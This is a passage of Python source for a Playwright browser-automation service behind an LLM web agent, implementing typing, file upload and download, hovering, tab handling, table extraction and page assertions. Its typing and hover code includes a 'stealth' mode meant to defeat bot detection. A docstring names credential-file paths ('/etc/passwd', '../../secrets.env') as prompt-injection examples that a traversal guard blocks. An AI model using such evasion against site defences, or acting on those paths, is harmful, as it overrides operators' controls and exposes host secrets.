        - Bots type at constant speed - humans don't
        - Makes timing analysis harder for bot detection
        - Creates realistic interaction patterns

        Args:
            element_id: Target element ID
            text: Text to type
            press_enter: Press Enter after typing

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found",
                error="InvalidElementID",
            )

        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        try:
            await self.page.wait_for_selector(selector, state="visible")

            # Task 4 (stealth): small randomized pause before interacting.
            await self._human_pause()

            # Try to click/focus with strict mode first
            try:
                await self.page.click(selector)  # Focus element
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    # FALLBACK: Use .first locator
                    logger.warning(
                        f"Selector '{selector}' matched multiple elements for typing. Using .first fallback."
                    )
                    locator = self.page.locator(selector).first
                    await locator.click()
                else:
                    raise

            # Type with random delays between keystrokes - unless the text
            # is too long for the per-character path to finish inside any
            # sane timeout: at the default 50-150ms/char, a 1000+ char text
            # takes 1-2.5 minutes, always blowing ACTION_TIMEOUT (20s) and
            # failing the action. Long texts switch to a single instant
            # fill(); the human-like timing pattern matters for short
            # inputs (search boxes, login forms), not for pasting long
            # content. fill() replaces the value instead of appending, but
            # so does the per-char path after the focus click above for any
            # field that was not pre-populated.
            warning = None
            if len(text) > self.settings.typing_slow_path_max_chars:
                await self.page.locator(selector).first.fill(
                    text, timeout=self.settings.action_timeout
                )
                warning = (
                    f"Text of {len(text)} chars entered instantly via fill() "
                    "(exceeds TYPING_SLOW_PATH_MAX_CHARS, per-keystroke "
                    "typing would exceed ACTION_TIMEOUT)"
                )
            else:
                for char in text:
                    await self.page.keyboard.type(char)
                    delay = random.randint(
                        self.settings.typing_speed_min, self.settings.typing_speed_max
                    )
                    await asyncio.sleep(delay / 1000.0)  # Convert ms to seconds

            if press_enter:
                await self.page.keyboard.press("Enter")

            return ActionResult(
                success=True, message=f"Typed text into element {element_id}", warning=warning
            )

        except Exception as e:
            await self._capture_error_snapshot("type_error")
            return ActionResult(success=False, message=f"Typing failed: {e}", error=str(e))

    async def select_option(self, element_id: int, value: str) -> ActionResult:
        """
        Select option from dropdown.

        BATTLE-READY SELECT:
        - Handles non-unique selectors with .first fallback
        - Works with <select> dropdowns

        Args:
            element_id: Target select element ID
            value: Option value to select

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found",
                error="InvalidElementID",
            )

        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        try:
            await self.page.wait_for_selector(selector, state="visible")

            # Try to select with strict mode first
            try:
                await self.page.select_option(selector, value=value)
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    # FALLBACK: Use .first locator
                    logger.warning(
                        f"Selector '{selector}' matched multiple elements for select. Using .first fallback."
                    )
                    locator = self.page.locator(selector).first
                    await locator.select_option(value=value)
                else:
                    raise

            return ActionResult(
                success=True, message=f"Selected option '{value}' in element {element_id}"
            )

        except Exception as e:
            await self._capture_error_snapshot("select_error")
            return ActionResult(success=False, message=f"Select failed: {e}", error=str(e))

    async def upload_file(self, element_id: int, file_path: str) -> ActionResult:
        """
        Upload a file to an <input type="file"> element.

        FIX (1.3 / Docs vs Code Drift #6): upload_file was advertised in the
        system prompt and valid per the Pydantic schema, but had no
        implementation here at all - every call fell through
        orchestrator._execute_action()'s final `else` branch and returned
        "Unknown tool: upload_file".

        SECURITY: file_path is resolved and MUST live inside
        settings.upload_allowed_dir. This prevents a hallucinated or
        attacker-influenced path (e.g. via prompt injection instructing the
        agent to "upload /etc/passwd" or "../../secrets.env") from reading
        arbitrary files off the host filesystem.

        Args:
            element_id: Target file-input element ID
            file_path: Path to the file to upload (must resolve inside
                settings.upload_allowed_dir)

        Returns:
            ActionResult with success status
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found",
                error="InvalidElementID",
            )

        try:
            allowed_root = self.settings.upload_allowed_dir.resolve()
            candidate = (allowed_root / file_path).resolve()
            # Path traversal guard: candidate must still be inside allowed_root
            if allowed_root not in candidate.parents and candidate != allowed_root:
                return ActionResult(
                    success=False,
                    message=(
                        f"file_path '{file_path}' resolves outside the allowed "
                        f"upload directory ({allowed_root}). Refusing to upload."
                    ),
                    error="PathTraversalBlocked",
                )
            if not candidate.is_file():
                return ActionResult(
                    success=False, message=f"File not found: {candidate}", error="FileNotFound"
                )
        except Exception as e:
            return ActionResult(
                success=False, message=f"Invalid file_path: {e}", error="InvalidPath"
            )

        try:
            await self.page.wait_for_selector(selector, state="attached")
            try:
                await self.page.set_input_files(selector, str(candidate))
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    logger.warning(
                        f"Selector '{selector}' matched multiple elements for upload. "
                        "Using .first fallback."
                    )
                    locator = self.page.locator(selector).first
                    await locator.set_input_files(str(candidate))
                else:
                    raise

            return ActionResult(
                success=True, message=f"Uploaded file '{candidate.name}' to element {element_id}"
            )

        except Exception as e:
            await self._capture_error_snapshot("upload_error")
            return ActionResult(success=False, message=f"Upload failed: {e}", error=str(e))

    async def capture_annotated_screenshot(self, elements: list[dict]) -> bytes:
        """
        TASK 4 (vision fallback with grounding): draw numbered marker boxes
        directly onto the LIVE page - one per currently-known interactive
        element, labeled with the SAME element_id already used by
        click_element/type_text/etc. in text mode - then screenshot the
        annotated page, then remove the overlay again.

        Why annotate the live DOM instead of post-processing the image?
        - No new dependency: the browser can draw its own overlay, so this
          doesn't need an image library (e.g. Pillow) just for this one
          feature.
        - Correctness: boxes are computed via the SAME getBoundingClientRect()
          the browser uses for layout, at the exact moment of the
          screenshot - no separate coordinate system to keep in sync.
        - Grounding: because the number printed on each box IS its
          element_id, a vision-capable model's answer ("element 7") maps
          directly onto the exact same action space as a text observation,
          with no free-text description to parse or misinterpret.

        Args:
            elements: The current element list from
                DOMProcessor.get_interactive_elements() (only `id` is
                used - matched back to the live DOM via its
                data-agent-id attribute). May be empty, in which case a
                plain, unannotated screenshot is returned.

        Returns:
            PNG screenshot bytes (with overlay boxes, if any elements were
            provided).
        """
        overlay_id = "cogniweb-agent-vision-overlay"
        element_ids = [e["id"] for e in elements if "id" in e]

        try:
            await self.page.evaluate(
                """([ids, overlayId]) => {
                    const existing = document.getElementById(overlayId);
                    if (existing) existing.remove();

                    const container = document.createElement('div');
                    container.id = overlayId;
                    container.style.position = 'fixed';
                    container.style.top = '0';
                    container.style.left = '0';
                    container.style.width = '100%';
                    container.style.height = '100%';
                    container.style.pointerEvents = 'none';
                    container.style.zIndex = '2147483647';

                    for (const id of ids) {
                        const target = document.querySelector(`[data-agent-id="${id}"]`);
                        if (!target) continue;
                        const rect = target.getBoundingClientRect();
                        if (rect.width <= 0 || rect.height <= 0) continue;

                        const box = document.createElement('div');
                        box.style.position = 'absolute';
                        box.style.left = rect.left + 'px';
                        box.style.top = rect.top + 'px';
                        box.style.width = rect.width + 'px';
                        box.style.height = rect.height + 'px';
                        box.style.border = '2px solid #ff2d55';
                        box.style.boxSizing = 'border-box';

                        const label = document.createElement('span');
                        label.textContent = String(id);
                        label.style.position = 'absolute';
                        label.style.top = '-1px';
                        label.style.left = '-1px';
                        label.style.background = '#ff2d55';
                        label.style.color = '#ffffff';
                        label.style.fontSize = '11px';
                        label.style.fontFamily = 'monospace';
                        label.style.padding = '1px 3px';
                        label.style.lineHeight = '1';

                        box.appendChild(label);
                        container.appendChild(box);
                    }

                    document.body.appendChild(container);
                }""",
                [element_ids, overlay_id],
            )

            screenshot_bytes = await self.page.screenshot(type="png")
        finally:
            try:
                await self.page.evaluate(
                    "(overlayId) => { const el = document.getElementById(overlayId); if (el) el.remove(); }",
                    overlay_id,
                )
            except Exception as cleanup_error:
                logger.debug(f"Failed to remove vision overlay (non-fatal): {cleanup_error}")

        return screenshot_bytes

    # ========================================================================
    # Task 2: new tool implementations
    # ========================================================================

    def _resolve_selector(self, element_id=None, selector=None) -> str | None:
        """Resolve an (element_id | selector) pair into a CSS selector.
        element_id wins when both are given (it is the agent's primary
        addressing mode); returns None when neither resolves."""
        if element_id is not None:
            try:
                element_id = int(element_id)
            except (ValueError, TypeError):
                return None
            return self.element_map.get(element_id)
        return selector

    async def wait_for_element(
        self,
        element_id: int | None = None,
        selector: str | None = None,
        state: str = "visible",
        timeout_ms: int | None = None,
    ) -> ActionResult:
        """
        Task 2: explicit condition-based wait (element appears/disappears/
        becomes visible) instead of blind `wait(seconds)`. Directly reduces
        the SelectorError class of races with rendering/AJAX.

        Args:
            element_id: element from the current observation (preferred)
            selector: raw CSS selector fallback
            state: attached | visible | hidden | detached
            timeout_ms: optional timeout override
        """
        resolved = self._resolve_selector(element_id, selector)
        if not resolved:
            return ActionResult(
                success=False,
                message=(
                    f"Element ID {element_id} not found in element map and no "
                    "valid selector given"
                ),
                error="InvalidElementID",
            )
        timeout = int(timeout_ms) if timeout_ms else self.settings.action_timeout
        try:
            await self.page.wait_for_selector(resolved, state=state, timeout=timeout)
            return ActionResult(
                success=True, message=f"Element matched state '{state}': {resolved}"
            )
        except PlaywrightTimeoutError:
            return ActionResult(
                success=False,
                message=f"Timed out ({timeout}ms) waiting for state '{state}' on {resolved}",
                error="WaitForElementTimeout",
            )
        except Exception as e:
            return ActionResult(
                success=False, message=f"wait_for_element failed: {e}", error=str(e)
            )

    async def hover_element(self, element_id: int) -> ActionResult:
        """
        Task 2: hover the element (dropdown menus, tooltips, hover-only
        controls). Uses the human-like pointer trajectory when stealth is on.
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found in element map",
                error="InvalidElementID",
            )
        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")
        try:
            await self.page.wait_for_selector(selector, state="visible")
            locator = self.page.locator(selector)
            try:
                if self.settings.enable_stealth_mode:
                    await self._human_pause()
                    await self._human_move_to_element(locator)
                await locator.hover(timeout=self.settings.action_timeout)
            except PlaywrightError as strict_error:
                if "strict mode violation" in str(strict_error).lower():
                    await locator.first.hover(timeout=self.settings.action_timeout)
                else:
                    raise
            return ActionResult(success=True, message=f"Hovered element {element_id}")
        except Exception as e:
            await self._capture_error_snapshot("hover_error")
            return ActionResult(success=False, message=f"Hover failed: {e}", error=str(e))

    async def press_key(self, key: str) -> ActionResult:
        """
        Task 2: send a keyboard event/combination (Enter, Escape, Tab,
        Control+a, ...) to the focused element / page, without needing a
        specific element_id.
        """
        if not isinstance(key, str) or not key.strip() or len(key) > 30:
            return ActionResult(
                success=False,
                message="press_key requires a short non-empty key name "
                "(e.g. 'Enter', 'Control+a')",
                error="InvalidKey",
            )
        try:
            await self.page.keyboard.press(key.strip())
            return ActionResult(success=True, message=f"Pressed key: {key.strip()}")
        except Exception as e:
            return ActionResult(success=False, message=f"press_key failed: {e}", error=str(e))

    async def extract_tables(self, selector: str = "table") -> list[dict]:
        """
        Task 2: extract <table>-like structures from the live page into
        structured {headers, rows} dicts (used by extract_structured_data).
        Bound: at most 20 tables x 100 rows x 500-char cells, so a hostile
        page cannot blow up context_data.
        """
        try:
            tables = await self.page.evaluate(
                """(sel) => {
                    const tables = Array.from(document.querySelectorAll(sel || 'table'));
                    return tables.slice(0, 20).map(t => {
                        const headerCells = Array.from(
                            t.querySelectorAll('thead th, tr:first-child th')
                        ).map(th => (th.innerText || '').trim());
                        const rowSelectors = t.tbody ? 'tbody tr' : 'tr';
                        const rows = Array.from(t.querySelectorAll(rowSelectors))
                            .filter(tr => !headerCells.length || tr.querySelector('td'))
                            .slice(0, 100)
                            .map(tr => Array.from(tr.querySelectorAll('td,th'))
                                .map(td => (td.innerText || '').trim().substring(0, 500)));
                        return {headers: headerCells, rows: rows};
                    });
                }""",
                selector,
            )
            return tables or []
        except Exception as e:
            logger.warning(f"extract_tables failed: {e}")
            return []

    async def list_tabs(self) -> list[dict]:
        """Task 2: list open pages/tabs in the shared browser context."""
        if self.context is None:
            return []
        tabs = []
        for i, page in enumerate(self.context.pages):
            try:
                title = await page.title()
            except Exception:
                title = ""
            tabs.append({"index": i, "url": page.url, "title": title})
        return tabs

    async def switch_tab(self, index: int) -> ActionResult:
        """
        Task 2: point this service's page at another open tab (e.g. one the
        agent opened by clicking a target=_blank link). The element_map is
        cleared - element IDs were assigned per page and are invalid on the
        new one until the next observation.
        """
        if self.context is None:
            return ActionResult(success=False, message="No browser context open", error="NoContext")
        pages = self.context.pages
        if not isinstance(index, int) or index < 0 or index >= len(pages):
            return ActionResult(
                success=False,
                message=f"Tab index {index} out of range (open tabs: {len(pages)})",
                error="TabIndexOutOfRange",
            )
        self.page = pages[index]
        self.page.set_default_timeout(self.settings.action_timeout)
        self.page.set_default_navigation_timeout(self.settings.page_load_timeout)
        self.element_map.clear()
        return ActionResult(success=True, message=f"Switched to tab {index}: {self.page.url}")

    async def go_forward(self) -> ActionResult:
        """Task 2: forward-history navigation, symmetric to go_back."""
        try:
            await self.page.go_forward(timeout=self.settings.page_load_timeout)
            return ActionResult(success=True, message="Went forward to next page")
        except Exception as e:
            return ActionResult(success=False, message=f"Go forward failed: {e}", error=str(e))

    async def download_file(self, element_id: int, timeout_ms: int | None = None) -> ActionResult:
        """
        Task 2: click an element expecting a Playwright download event and
        save the file into the operator-controlled downloads directory
        (DOWNLOAD_ALLOWED_DIR) - the download twin of upload_file's
        path-traversal guard: the suggested filename is reduced to its
        basename before joining the target dir.
        """
        selector = self.element_map.get(element_id)
        if not selector:
            return ActionResult(
                success=False,
                message=f"Element ID {element_id} not found in element map",
                error="InvalidElementID",
            )
        safety_error = await self._check_element_safety(selector)
        if safety_error:
            return ActionResult(success=False, message=safety_error, error="BlockedProtocol")

        timeout = int(timeout_ms) if timeout_ms else self.settings.action_timeout
        try:
            async with self.page.expect_download(timeout=timeout) as download_info:
                await self.page.click(selector)
            download = await download_info.value

            # Sanitize: keep only the basename (no traversal, no subdirs).
            suggested = Path(download.suggested_filename or "download.bin").name
            self.settings.download_allowed_dir.mkdir(parents=True, exist_ok=True)
            dest = self.settings.download_allowed_dir / suggested
            await download.save_as(str(dest))
            return ActionResult(
                success=True,
                message=f"Downloaded file saved: {dest}",
                data={"path": str(dest), "filename": suggested},
            )
        except PlaywrightTimeoutError:
            return ActionResult(
                success=False,
                message=f"No download started within {timeout}ms after clicking element {element_id}",
                error="DownloadTimeout",
            )
        except Exception as e:
            await self._capture_error_snapshot("download_error")
            return ActionResult(success=False, message=f"Download failed: {e}", error=str(e))

    async def find_element_by_text(
        self, text: str, tag: str | None = None, limit: int = 10
    ) -> list[dict]:
        """
        Task 2: semantic element search - find VISIBLE elements whose own
        text contains `text`, annotate them with fresh data-agent-id
        attributes (continuing the id counter so they don't collide with
        the current element_map) and register them in the map. Returns the
        matches so the agent can immediately click/type by id.

        Unlike the budget-trimmed DOM snapshot, this scans the whole live
        DOM - the fallback when the relevant element didn't make it into
        the current observation.
        """
        if not text or not text.strip():
            return []
        start_id = max(self.element_map.keys(), default=-1) + 1
        try:
            matches = await self.page.evaluate(
                """([needle, tagFilter, limit, startId]) => {
                    const results = [];
                    let id = startId;
                    const walker = document.createTreeWalker(
                        document.body, NodeFilter.SHOW_ELEMENT
                    );
                    const needleLower = needle.toLowerCase();
                    while (walker.nextNode() && results.length < limit) {
                        const el = walker.currentNode;
                        if (tagFilter && el.tagName.toLowerCase() !== tagFilter) continue;
                        const ownText = Array.from(el.childNodes)
                            .filter(n => n.nodeType === 3)
                            .map(n => (n.textContent || '').trim())
                            .join(' ');
                        if (!ownText || !ownText.toLowerCase().includes(needleLower)) continue;
                        const rect = el.getBoundingClientRect();
                        if (rect.width <= 0 || rect.height <= 0) continue;
                        el.setAttribute('data-agent-id', String(id));
                        results.push({
                            id: id,
                            tag: el.tagName.toLowerCase(),
                            text: ownText.substring(0, 200),
                            selector: `[data-agent-id="${id}"]`
                        });
                        id++;
                    }
                    return results;
                }""",
                [text.strip(), (tag or "").lower() or None, max(1, min(limit, 25)), start_id],
            )
        except Exception as e:
            logger.warning(f"find_element_by_text failed: {e}")
            return []

        for m in matches or []:
            self.element_map[m["id"]] = m["selector"]
        return matches or []

    async def assert_page_state(
        self,
        expect_text_present: str | None = None,
        expect_url_contains: str | None = None,
        expect_element_visible: int | None = None,
    ) -> ActionResult:
        """
        Hardening supplement, Task 2: cheap (no-LLM) page-state assertion.
        Unlike the opt-in evaluator (2.2, one extra LLM call on 'done'),
        this is a plain browser-side check the agent can use mid-task.

        Always returns an ActionResult - a failed assertion is the VALUE
        (error="AssertionFailed"), never a raised exception: the LLM sees
        it as an ordinary step result and decides what to do next.
        """
        try:
            if expect_text_present is not None:
                body_text = await self.page.inner_text("body")
                if expect_text_present in body_text:
                    return ActionResult(
                        success=True, message=f"Text found on page: '{expect_text_present}'"
                    )
                return ActionResult(
                    success=False,
                    message=f"AssertionFailed: text '{expect_text_present}' not present on page",
                    error="AssertionFailed",
                )

            if expect_url_contains is not None:
                if expect_url_contains in self.page.url:
                    return ActionResult(
                        success=True, message=f"URL contains '{expect_url_contains}'"
                    )
                return ActionResult(
                    success=False,
                    message=(
                        f"AssertionFailed: current URL '{self.page.url}' does not contain "
                        f"'{expect_url_contains}'"
                    ),
                    error="AssertionFailed",
                )

            if expect_element_visible is not None:
                selector = self.element_map.get(int(expect_element_visible))
                if not selector:
                    return ActionResult(
                        success=False,
                        message=(
                            f"AssertionFailed: element {expect_element_visible} is not in "
                            "the current element map"
                        ),
                        error="AssertionFailed",
                    )
                visible = await self.page.locator(selector).first.is_visible()
                if visible:
                    return ActionResult(
                        success=True,
                        message=f"Element {expect_element_visible} is visible",
                    )
                return ActionResult(
                    success=False,
                    message=f"AssertionFailed: element {expect_element_visible} is not visible",
                    error="AssertionFailed",
                )

            return ActionResult(
                success=False,
                message="assert_page_state received no expectation",
                error="MissingExpectation",
            )
        except Exception as e:
            # An assertion must never crash the loop either
            return ActionResult(
                success=False,
                message=f"assert_page_state failed to evaluate: {e}",
                error="AssertionCheckError",
            )

    async def _capture_error_snapshot(self, error_type: str) -> tuple[Path | None, Path | None]:
        """
        Capture screenshot and HTML dump on error.

        Why critical?
        - Screenshots show visual state that logs can't capture
        - HTML dumps allow post-mortem analysis
        - Essential for debugging flaky tests and production issues

        Args:
            error_type: Type of error for filename

        Returns:
            Tuple of (screenshot_path, html_path)
        """
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = None
        html_path = None

        try:
            # Screenshot
            screenshot_file = self.settings.screenshot_dir / f"error_{error_type}_{timestamp}.png"
            await self.page.screenshot(path=str(screenshot_file))
            screenshot_path = screenshot_file

            # HTML dump
            # FIX (Security Major): the raw HTML was previously written to
            # disk with zero sanitization. This is called from every
            # click/type/select/upload/navigate failure path - i.e. exactly
            # when a login or payment form has just failed to submit.
            # Redact obviously sensitive values (password inputs,
            # csrf/session/token-looking fields) before persisting.
            html_file = self.settings.screenshot_dir / f"error_{error_type}_{timestamp}.html"
            html_content = await self.page.content()
            html_content = _redact_sensitive_html(html_content)
            html_file.write_text(html_content, encoding="utf-8")
            html_path = html_file

        except Exception as e:
            logger.warning(f"Failed to capture error snapshot: {e}")

        return screenshot_path, html_path

    async def detect_captcha(self) -> bool:
        """
        Detect if current page contains a captcha by looking for actual captcha elements.
        """
        try:
            # Проверяем видимые iframe reCAPTCHA
            recaptcha_iframe = await self.page.query_selector("iframe[src*='recaptcha']")
            if recaptcha_iframe:
                return True

            # Проверяем элементы hCaptcha
            hcaptcha_div = await self.page.query_selector("div.h-captcha")
            if hcaptcha_div:
                return True

            return False

        except Exception:
            return False

    async def get_current_url(self) -> str:
        """Get current page URL."""
        return self.page.url

    async def get_page_title(self) -> str:
        """Get current page title."""
        return await self.page.title()

    async def scroll(self, direction: str = "down") -> ActionResult:
        """
        Scroll page to load more content or find elements.

        Args:
            direction: "up" or "down"

        Returns:
            ActionResult
        """
        try:
            if direction == "down":
                await self.page.evaluate("window.scrollBy(0, window.innerHeight)")
            else:
                await self.page.evaluate("window.scrollBy(0, -window.innerHeight)")

            await asyncio.sleep(0.5)  # Let content load

            return ActionResult(success=True, message=f"Scrolled {direction}")
        except Exception as e:
            return ActionResult(success=False, message=f"Scroll failed: {e}", error=str(e))
